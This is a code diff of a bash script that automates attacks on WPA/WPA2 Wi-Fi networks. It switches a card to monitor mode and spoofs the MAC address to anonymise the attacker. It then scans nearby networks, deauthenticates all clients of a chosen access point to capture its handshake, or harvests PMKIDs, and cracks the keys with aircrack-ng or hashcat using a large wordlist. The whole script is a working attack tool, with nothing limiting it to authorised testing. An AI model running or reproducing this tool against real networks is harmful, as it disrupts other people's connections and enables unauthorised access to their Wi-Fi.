@@ -2,36 +2,75 @@
 
 trap ctrl_c INT
 
-# Colours
+# Colours and uses
 
-red='\033[0;31m'
-green='\033[0;32m'
-yellow='\033[0;33m'
-blue='\033[0;34m'
-magenta='\033[0;35m'
-cyan='\033[0;36m'
-white='\033[0;37m'
-grey='\033[0;37m'
-orange='\033[0;33m'
-purple='\033[0;35m'
+red='\033[0;31m' # Something went wrong
+green='\033[0;32m' # Something went well
+yellow='\033[0;33m' # Warning
+blue='\033[0;34m' # Info
+purple='\033[0;35m' # When asking something to the user
+cyan='\033[0;36m' # Something is happening
+grey='\033[0;37m' # Show a command to the user
 nc='\033[0m' # No Color
 
+wrong=${red}
+good=${green}
+warn=${yellow}
+info=${blue}
+ask=${purple}
+doing=${cyan}
+cmd=${grey}
+
+function enable_managed_mode(){
+    echo -e "\n${doing}[~]${nc} Taking network card to managed mode..."
+    sleep 0.5
+    airmon-ng stop ${network_card} &>/dev/null
+    echo -e "${good}[+]${nc} Network card is now in managed mode."
+    echo -e "\n${doing}[~]${nc} Restarting network manager..."
+    sleep 0.5
+    service network-manager restart &>/dev/null
+    service NetworkManager restart &>/dev/null
+    service wpa_supplicant restart &>/dev/null
+    echo -e "${good}[+]${nc} Network manager restarted."
+}
+
+function enable_monitor_mode(){
+    echo -e "\n${doing}[~]${nc} Taking network card to monitor mode"
+    airmon-ng start $network_card &>/dev/null
+    ifconfig ${network_card}mon &>/dev/null
+    if [ "$(echo $?)" == "0" ]; then
+        network_card="${network_card}mon"
+    else
+        ifconfig ${network_card} down && macchanger -a ${network_card} &>/dev/null
+        ifconfig ${network_card} up &>/dev/null
+    fi
+    echo -e "\n${good}[+]${nc} Network card to monitor mode"; sleep 0.5
+
+    echo -e "\n${doing}[~]${nc} Killing processes that could interfere"
+    killall wpa_supplicant dhclient 2>/dev/null
+    airmon-ng check kill &>/dev/null
+    echo -e "\n${good}[+]${nc} Processes killed correctly"
+
+    echo -e "\n${doing}[~]${nc} Annonymizing MAC address"
+    macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')
+
+    echo -e "\n${good}[+]${nc} New MAC address: $macaddress\n"
+}
 
 function exit_script() {
     if [ "$we_attack" = "0" ]; then
-        echo -e "\n${green}[-]${nc} Taking network card to monitor mode..."
-        sleep 0.5
-        airmon-ng stop ${network_card} &>/dev/null
-        echo -e "${green}[+]${nc} Network card is now in managed mode."
-        # restart network manager
-        echo -e "\n${green}[-]${nc} Restarting network manager..."
-        sleep 0.5
-        service network-manager restart &>/dev/null
-        service NetworkManager restart &>/dev/null
-        service wpa_supplicant restart &>/dev/null
-        echo -e "${green}[+]${nc} Network manager restarted."
+        echo -e "\n${warn}[*]${nc} We are gonna to exit the script..."
+        echo -e "\n${info}[·]${nc} Managed mode allows you to navigate into internet and that stuff. If had finished your attacks it's likeable to bring the network back to managed mode."
+        echo -e "\n${info}[·]${nc} If you are cracking some password bring the network card to managed mode, dosen't affect on anything"
+        echo -e "\n${ask}[?]${nc} Do you want to bring the network back to managed mode? [y/n]"
+        read answer
+        if [ "${answer,,}" = "y" ]; then
+            enable_managed_mode
+        else
+            echo -e "\n${yellow}[!]${nc} Leaving network card in monitor mode..."
+        fi
     fi
-    echo -e "\n${green}[-]${nc} Exiting..."
+    echo -e "\n${good}[+]${nc} Exiting..."
     tput cnorm; exit 0
 }
 
@@ -40,14 +79,17 @@ function ctrl_c() {
 }
 
 function help_panel(){
-    echo -e "Usage: ${green}$0 ${yellow}-a attack_mode"
+    echo -e "Usage: ${good}$0 ${info}-a attack_mode"
     echo -e "\ta) Attack mode"
     echo -e "\t${nc}Available attack modes:"
-    echo -e "\t\t${yellow}PMKID"
+    echo -e "\t\t${info}PMKID"
     echo -e "\t\tHandshake"
-    echo -e "\t${blue}h) Help panel"
+    echo -e "\t${info}n) Change network card mode"
+    echo -e "\t${nc}Available network card modes:"
+    echo -e "\t\t${info}managed"
+    echo -e "\t\tmonitor"
+    echo -e "\t${doing}h) Help panel"
     echo -e "\tShow this help panel"
-
     echo -e "\n\t${grey}Example: $0 -a PMKID${nc}"
 
     exit_script
@@ -63,12 +105,12 @@ function check_installer_manager(){
         installer="pacman"
         confirmation="Sy"
     else
-        echo -e "${yellow}[-]${nc}No package manager found"
+        echo -e "${wrong}[!]${nc}No package manager found"
     fi
 }
 
 function install_hcxdumptool(){
-    echo -e "${green}[-]${nc} Installing hcxdumptool..."
+    echo -e "${doing}[~]${nc} Installing hcxdumptool..."
     sleep 0.5
     if [[ $installer == "apt" ]]; then
         apt install -y libcurl4-openssl-dev libssl-dev pkg-config &>/dev/null
@@ -79,20 +121,23 @@ function install_hcxdumptool(){
     make install 1>/dev/null
     cd ..
     rm -rf hcxdumptool &>/dev/null
+    if command -v hcxdumptool &>/dev/null ; then
+        installed_programs+=($program)
+    fi
 }
 
 function check_kaonashi(){
     if [[ ! -f /usr/share/wordlists/kaonashiWPA100M.txt ]]; then
-        echo -e "${yellow}[-]${nc} Kaonashi is not in the system"
-		echo -e "${yellow}[-]${nc} Downloading kaonashi .torrent file to the current directory"
-        echo -e "${yellow}[-]${nc} Please, download the torrent and extract the file to /usr/share/wordlists/"
-        echo -e "${yellow}[-]${nc} After that, run the script again"
+        echo -e "${info}[·]${nc} kaonashi is not in the system"
+		echo -e "${info}[·]${nc} Downloading kaonashi .torrent file to the current directory"
+        echo -e "${info}[·]${nc} Please, download the torrent and extract the file to /usr/share/wordlists/"
+        echo -e "${info}[·]${nc} After that, run the script again"
         mkdir -p /usr/share/wordlists/
         wget https://github.com/kaonashi-passwords/Kaonashi/blob/master/wordlists/kaonashiWPA100M.7z.torrent &>/dev/null
         sleep 0.5
         exit_script
     else
-        echo -e "${green}[+]${nc} Kaonashi found"
+        echo -e "${good}[+]${nc} kaonashi found"
         sleep 0.5
     fi
 }
@@ -101,133 +146,167 @@ function dependencies(){
     #clear;
     programs=(aircrack-ng macchanger hcxdumptool hashcat tshark)
 
-    echo -e "\n${yellow}[*]${nc} Checking dependencies...\n"
+    echo -e "\n${doing}[~]${nc} Checking dependencies...\n"
     sleep 2
+
+    installed_programs=()
 
     for program in "${programs[@]}"; do
         if ! command -v $program &> /dev/null; then
             check_installer_manager
-            echo -e "${red}[-] ${nc}$program could not be found"
+            echo -e "${yellow}[*] ${nc}$program could not be found"
             $installer &> /dev/null
             if [[ $program == "hcxdumptool" ]] && [[ $installer != "pacman" ]]; then
                 install_hcxdumptool
-            else
+            elif [[ $program == "hcxdumptool" ]] && [[ $installer == "pacman" ]]; then
                 $installer install -Sy $program &> /dev/null
-            fi
-            if [ "$(echo $?)" == "0" ]; then
-                echo -e "${yellow}[*]${nc} Installing $program with $installer"
+            elif [ "$(echo $?)" == "0" ]; then
+                echo -e "${doing}[~]${nc} Installing $program with $installer"
                 sleep 2
                 echo -e "${grey}$ sudo $installer install $program${nc}"
                 sudo $installer install $program -${confirmation} 1>/dev/null
                 if [ "$(echo $?)" == "0" ]; then
-                    echo -e "${green}[+]${nc} $program has been installed"
+                    echo -e "${good}[+]${nc} $program has been installed"
+                    installed_programs+=($program)
                 else
-                    echo -e "${red}[-]${nc} $program could not be installed"
-                    exit_script
+                    echo -e "${wrong}[-]${nc} $program could not be installed with $installer. Please, install it manually"
                 fi
             else
-                echo -e "${red}[-]${nc} Could not install $program"
-                exit_script
+                echo -e "${wrong}[-]${nc} Could not install $program because I could not find a package manager on your system. Please, install it manually"
             fi
         else
-            echo -e "${green}[+]${nc} $program found"
+            echo -e "${good}[+]${nc} $program found"
             sleep 0.5
+            installed_programs+=($program)
         fi
     done
+
     check_kaonashi
-    echo -e "\n${green}[+]${nc} All dependencies are installed"
-    sleep 1
+    programs=(aircrack-ng macchanger hcxdumptool hashcat tshark)
+    if [[ ${installed_programs} == ${programs} ]]; then
+        echo -e "\n${good}[+]${nc} All dependencies are installed"
+        sleep 1
+    else
+        echo -e "\n${wrong}[-]${nc} Some dependencies are not installed"
+        echo -e "${info}[~]${nc} Please, install them manually and run the script again"
+        echo -e "${info}[~]${nc} For handshakes attack:"
+        echo -e "\t${info}[~]${nc} macchanger -> For changing your MAC address and annonymize yourself"
+        echo -e "\t${info}[~]${nc} aircrack-ng -> For listing the networks and capturing the handshake"
+        echo -e "\t${info}[~]${nc} tshark -> For reading the handshake file and verify it"
+        echo -e "${info}[~]${nc} For PMKID attack:"
+        echo -e "\t${info}[~]${nc} macchanger -> For changing your MAC address and annonymize yourself"
+        echo -e "\t${info}[~]${nc} hcxdumptool -> For capturing the PMKID"
+        echo -e "\t${info}[~]${nc} hashcat -> For cracking the PMKID"
+        sleep 1
+        exit_script
+    fi
 }
 
 function select_target_network(){
-    echo -e "\n${yellow}[*]${nc} Now we are goind to scan the networks around you..."
+    echo -e "\n${yellow}[*]${nc} Now we are going to scan the networks around you..."
     echo -e "${yellow}[*]${nc} A new terminal will be opened to show you the networks around you"
     sleep 1
 
     xterm -hold -e "airodump-ng ${network_card} -w airodump-dump --write-interval 1 --output-format csv"&
     airodump_xterm_pid=$!
 
-    echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it when you press ${red}enter${nc}"
-    echo -e "${yellow}[*]${nc} Wait a few seconds and pause the scan with ${red}enter${nc}..."
+    echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it when you press ${good}enter${nc}"
+    echo -e "${yellow}[*]${nc} Wait a few seconds and pause the scan with ${good}enter${nc}..."
     wait_for_confirmation
     kill -9 $airodump_xterm_pid; wait $airodump_xterm_pid &>/dev/null
 
     sed -i '1,2d' airodump-dump-01.csv
     sed -i '1,/Station MAC/!d' airodump-dump-01.csv
 
-    networks="|______BSSID______|________ESSID_______|CHANNEL|POWER|SECURITY|,"
+    networks="|······BSSID······|········ESSID·······|CHANNEL|POWER|SECURITY|,"
     while IFS=, read -r bssid first_time last_time channel speed privacy cipher authentication power beacons iv lan_ip id_length essid key; do
         if [[ $privacy != " OPN" ]]; then
-            empty_spaces="                    "
-            parsed_essid="${essid:0:20}${empty_spaces:0:$((20 - ${#essid}))}"
-            networks="${networks}|${bssid}|${parsed_essid::20}|${channel}|${power}|${privacy},"
+            dots="····················"
+            essid="${essid}${dots}"
+            channel="${channel}${dots}"
+            power="$(100 - power)"
+            power="${power} %${dots}"
+            privacy="${privacy}${dots}"
+            networks="${networks}|${bssid}|${essid::20}|${channel::7}|${power::6}|${privacy::8}|,"
         fi
     done < airodump-dump-01.csv
 
     echo $networks > airodump-dump-01.parsed
 
-    echo -e "\n${yellow}[*]${nc} Scanned networks"
-    PS3="[*] Select the target network: "
+    echo -e "\n${good}[+]${nc} Scanned networks"
+    PS3="[?] Select the target network: "
     IFS=,
     select target_network in $(cat airodump-dump-01.parsed); do
         if [[ $target_network == "" ]]; then
-            echo -e "${red}[-]${nc} Invalid option"
+            echo -e "${wrong}[-]${nc} Invalid option"
         else
             break
         fi
     done
     unset IFS
     echo $target_network
-    ap_bssid=$(echo $target_network | cut -d'|' -f2)
-    ap_channel=$(echo $target_network | cut -d'|' -f4)
-    echo -e "\n${green}[+]${nc} You choose ${ap_bssid} on channel ${ap_channel} with the name ${ap_essid}"
+    ap_bssid=$(echo $target_network | cut -d'|' -f2 | sed 's/·//g')
+    ap_channel=$(echo $target_network | cut -d'|' -f4 | sed 's/ //g' | sed 's/·//g')
+    ap_essid=$(echo $target_network | cut -d'|' -f3)
+    echo -e "\n${good}[+]${nc} You choose ${yellow}${ap_bssid}${nc} on channel ${yellow}${ap_channel}${nc} with the name ${yellow}${ap_essid}${nc}"
     rm -rf airodump*
-    exit_script
 }
 
 function handshake(){
-    echo -e "${yellow}[*]${nc} Listening network traffic of ${ap_bssid} on channel ${ap_channel}"
+    echo -e "\n${doing}[~]${nc} Listening network traffic of ${ap_bssid} on channel ${ap_channel}"
+    sleep 0.5
+    echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show you the traffic of the network"
+    sleep 0.5
+    echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it"
+    sleep 0.5
     xterm -hold -e "airodump-ng -c $ap_channel -w "capture_${ap_bssid}" --bssid "${ap_bssid}" ${network_card}"&
     airodump_filter_xterm_pid=$!
 
-    sleep 5; echo -e "${yellow}[*]${nc} Deauthenticating all clients..."
+    echo -e "\n${yellow}[*]${nc} A new terminal will be opened to send the deauth packets"
+    sleep 0.5
+    echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it"
+    sleep 5
+    echo -e "\n${doing}[~]${nc} Deauthenticating all clients..."; sleep 0.5
     xterm -hold -e "aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"&
     aireplay_xterm_pid=$!
 
     sleep 10; kill -9 $aireplay_xterm_pid; wait $aireplay_xterm_pid &>/dev/null
+    echo -e "\n${green}[+]${nc} Signal for deauthenticate all clients sended"
 
-    echo -e "${yellow}[*]${nc} Waiting handshake for 60 seconds..."
+    echo -e "\n${doing}[~]${nc} Waiting handshake for 60 seconds..."
 
     sleep 60 # Listen for 60 seconds
 
     tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
 
     if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
-        echo -e "${green}[+]${nc} Handshake captured"
+        echo -e "\n${good}[+]${nc} Handshake captured"
         kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
     else
-        echo -e "${red}[-]${nc} Handshake could not be captured"
-        echo -ne "${red}[-]${nc} Send s to stop listen [s]: " && read answer
+        echo -e "\n${wrong}[-]${nc} Handshake could not be captured"
+        echo -e "\n${yellow}[*]${nc} You could wait until the handshake is captured or press ${ask}enter${nc} to continue"
+        echo -e "\n${info}[·]${nc} TIP: You can try to see the clients and send the deauth packets to them using aireplay in another terminal: "
+        echo -e "${grey}sudo aireplay-ng -0 5 -a ${ap_bssid} -c client_mac_address ${network_card}"
+        echo -e "${grey}sudo aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}"
+        wait_for_confirmation
         tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
         if [[ $(cat handshake.txt | grep "Message 1 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 2 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 3 of 4" | wc -l) != "0" ]] && [[ $(cat handshake.txt | grep "Message 4 of 4" | wc -l) != "0" ]]; then
-            echo -e "${green}[+]${nc} Handshake captured"
+            echo -e "\n${good}[+]${nc} Handshake captured"
+            kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
         else
-            echo -e "${red}[-]${nc} Handshake could not be captured"
-        fi
-        kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
-        echo -ne "${purple}[?]${nc} Do you want to try again with the same network? [y/n]: " && read answer
-        if [[ $answer == "y" ]]; then
-            echo -e "${red}[-]${nc} The failed captures will be deleted"
+            echo -e "\n${wrong}[-]${nc} Handshake could not be captured"
+            kill -9 $airodump_filter_xterm_pid; wait $airodump_filter_xterm_pid &>/dev/null
+            echo -e "\n${wrong}[-]${nc} The failed captures will be deleted"
             rm -rf capture_*
-            handshake
-        fi
-        echo -ne "${purple}[?]${nc} Do you want to try again with another network? [y/n]: " && read answer
-
-        if [[ $answer == "y" ]]; then
-            echo -e "${red}[-]${nc} The failed captures will be deleted"
-            rm -rf capture_*
-            select_target_network
-            handshake
+            echo -ne "\n${ask}[?]${nc} Do you want to try again with the same network? [y/n]: " && read answer
+            if [[ $answer == "y" ]]; then
+                handshake
+            fi
+            echo -ne "\n${ask}[?]${nc} Do you want to try again with another network? [y/n]: " && read answer
+            if [[ $answer == "y" ]]; then
+                select_target_network
+                handshake
+            fi
         fi
     fi
     tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1> handshake.txt 2>/dev/null
@@ -239,10 +318,7 @@ function handshake(){
         aircrack_xterm_pid=$!
         echo -e "\n${yellow}[*]${nc} Cracking handshake..."
         echo -e "\n${yellow}[!]${nc} Remember to kill the process when you have the password"
-        echo -e "${yellow}[!]${nc} sudo kill -9 $aircrack_xterm_pid"
-    else
-        echo -e "${red}[-]${nc} The failed captures will be deleted"
-        rm -rf capture_*
+        echo -e "\n${yellow}[!]${nc} Use the following command: ${grey}sudo kill -9 $aircrack_xterm_pid${nc}"
     fi
 
     rm -rf handshake.txt
@@ -250,14 +326,14 @@ function handshake(){
 }
 
 function pmkid(){
-    echo -ne "${yellow}[?]${nc} How many minutes do you want to listen? [Recommended: 1]: " && read minutes
+    echo -ne "${ask}[?]${nc} How many minutes do you want to listen? [Recommended: 1]: " && read minutes
     minutes=$(( minutes * 60 ))
-    echo -e "\n${yellow}[*]${nc} Start listening at $(date +%H:%M:%S)..."
+    echo -e "\n${doing}[~]${nc} Start listening at $(date +%H:%M:%S)..."
     xterm -hold -e "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" &
     hcxdumptool_xterm_pid=$!
     sleep ${minutes}
     kill -9 $hcxdumptool_xterm_pid; wait $hcxdumptool_xterm_pid &>/dev/null
-    echo -e "\n${yellow}[*]${nc} Obtaining hashes..."
+    echo -e "\n${doing}[~]${nc} Obtaining hashes..."
     hash_name="hashes_pmkid_$(date +%y_%m_%d_%H_%M).hc22000"
     hcxpcapngtool -o ${hash_name} capture_pmkid 1>/dev/null
     rm -rf capture_pmkid &>/dev/null
@@ -269,19 +345,19 @@ function pmkid(){
 
     if [ "$(echo $?)" == "0" ]; then
 
-        echo -e "\n${yellow}[*]${nc} Initiating brute-force attack..."
+        echo -e "\n${doing}[~]${nc} Initiating brute-force attack..."
         sleep 1
         xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} /usr/share/wordlists/kaonashiWPA100M.txt" &
         hashcat_xterm_pid=$!
-        echo -e "\n${yellow}[!]${nc} Remember to kill the process when you finished"
-        echo -e "${yellow}[!]${nc} sudo kill -9 $hashcat_xterm_pid"
+        echo -e "\n${yellow}[*]${nc} Remember to kill the process when you finished"
+        echo -e "\n${info}[·]${nc} Use the following command: ${grey}sudo kill -9 $hashcat_xterm_pid${nc}"
     else
-        echo -e "\n${red}[!]${nc} The hashes are not captured :("
+        echo -e "\n${wrong}[!]${nc} The hashes are not captured :("
 
-        echo -ne "\n${purple}[?]${nc} Do you want to retry? (y/n): "; read option
+        echo -ne "\n${ask}[?]${nc} Do you want to retry? (y/n): "; read option
 
         if [ "${option,,}" == "yes" ] || [ "${option,,}" == "y" ]; then
-            echo -e "\n${yellow}[R]${nc} Retrying...\n"
+            echo -e "\n${doing}[~]${nc} Retrying...\n"
             sleep 1
             pmkid
         fi
@@ -292,24 +368,9 @@ function attack(){
     #clear
     choose_card
 
-    echo -e "${starting}(_!_)${nc} Starting attack (attack_mode=$attack_mode || network_card=$network_card )\n"
+    echo -e "${info}[·]${nc} Starting ${attack_mode} attack with $network_card network card"
 
-    echo -e "${yellow}[*]${nc} Configuring network card"
-    airmon-ng start $network_card &>/dev/null
-    ifconfig ${network_card}mon &>/dev/null
-    if [ "$(echo $?)" == "0" ]; then
-        network_card="${network_card}mon"
-    else
-        ifconfig ${network_card} down && macchanger -a ${network_card} &>/dev/null
-        ifconfig ${network_card} up &>/dev/null
-    fi
-
-    killall wpa_supplicant dhclient 2>/dev/null
-    airmon-ng check kill &>/dev/null
-
-    macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')
-
-    echo -e "\n${green}[*]${nc} New MAC address: $macaddress\n"
+    enable_monitor_mode
 
     if [[ "${attack_mode,,}" == "handshake" ]]; then
         select_target_network
@@ -317,16 +378,17 @@ function attack(){
     elif [[ "${attack_mode,,}" == "pmkid" ]]; then
         pmkid
     else
-        echo -e "${red}[-]${nc} Invalid attack mode"
+        echo -e "${wrong}[-]${nc} Invalid attack mode"
         exit_script
     fi
-    }
+
+}
 
 function choose_card(){
-    echo -e "\n${yellow}[?]${nc} Choose a network card: "
+    echo -e "\n${ask}[?]${nc} Choose a network card: "
     PS3="Network card: "
     select network_card in $(ifconfig | awk '{print $1}' | grep : | sed 's/://'); do
-        echo -e "\n${yellow}[*]${nc} Card=${network_card}\n"
+        echo -e "\n${good}[+]${nc} You choose ${network_card}\n"
         sleep 1
         break
     done
@@ -334,12 +396,11 @@ function choose_card(){
 }
 
 function wait_for_confirmation(){
-    echo -e "\n${yellow}[?]${nc} Press enter to continue" && read enter
+    echo -e "\n${ask}[?]${nc} Press ${ask}enter${nc} to continue..." && read enter
     if [[ $enter != "" ]]; then
         exit_script
     fi
 }
-
 # Main function
 
 tput civis
@@ -348,25 +409,35 @@ echo ""
 while getopts ":a:h" arg; do
     case $arg in
         a) attack_mode=$OPTARG ;;
+        n) network_card_mode=$OPTARG ;;
         h) help_panel ;;
-        ?) echo -e "Invalid option: -$OPTARG\n"; help_panel ;;
+        ?) echo -e "${wrong}[!]${nc}Invalid option: -$OPTARG\n"; help_panel ;;
     esac
 done
 
-
 if [ "$(id -u)" == "0" ]; then
 
+    if [[ $network_card_mode == "monitor" ]]; then
+        choose_card
+        enable_monitor_mode
+        exit_script
+    elif [[ $network_card_mode == "managed" ]]; then
+        choose_card
+        enable_managed_mode
+        exit_script
+    fi
+
     if [ -z "$attack_mode" ]; then
-        echo -e "Missing arguments!\n"
+        echo -e "${wrong}[!]${nc}Missing arguments!\n"
         help_panel
     fi
 
-    #dependencies
+    dependencies
     attack
 
     exit_script
 else
-    echo -e "${red}You must be root to run this script.${nc}"
+    echo -e "${wrong}[!]${nc}You must be root to run this script"
     exit_script
 fi
 
